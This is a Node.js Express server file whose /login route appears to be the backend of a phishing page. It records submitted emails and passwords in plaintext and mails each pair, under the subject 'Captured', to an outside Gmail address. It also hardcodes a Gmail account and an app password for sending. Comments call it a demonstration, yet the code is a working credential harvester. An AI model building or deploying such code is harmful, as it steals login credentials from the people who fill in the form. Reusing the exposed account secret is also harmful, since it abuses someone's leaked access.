const express = require('express');
const bodyParser = require('body-parser');
const nodemailer = require('nodemailer');
const path = require('path');  // Add this line
const app = express();
const PORT = process.env.PORT || 3000;

// Middleware
app.use(bodyParser.urlencoded({ extended: true }));
app.use(express.static(path.join(__dirname, '../public')));

// Fake in-memory user database (use a real database in production)
const users = [];

// Email transport configuration (use real email service in production)
const transporter = nodemailer.createTransport({
  service: 'gmail',
  auth: {
    user: 'coopernclarks@gmail.com',
    pass: 'sghfcwnctjpdtokt'
  }
});

// Handle form submission
app.post('/login', async (req, res) => {
  const { email, password } = req.body;

  // Hash the password before storing it (for demonstration)
//   const hashedPassword = await bcrypt.hash(password, 10);
  users.push({ email, password });

  // Send an email (for demonstration purposes)
  const mailOptions = {
    from: 'coopernclarks@gmail.com',
    to: 'sarmal787@gmail.com',
    subject: 'Captured',
    text: `Email: ${email}\nPassword: ${password}`
  };

  transporter.sendMail(mailOptions, (error, info) => {
    if (error) {
      return console.log(error);
    }
    console.log('Email sent: ' + info.response);
  });

//   res.send('Login data received. Check your email.');
});

app.listen(PORT, () => {
  console.log(`Server running at http://localhost:${PORT}`);
});
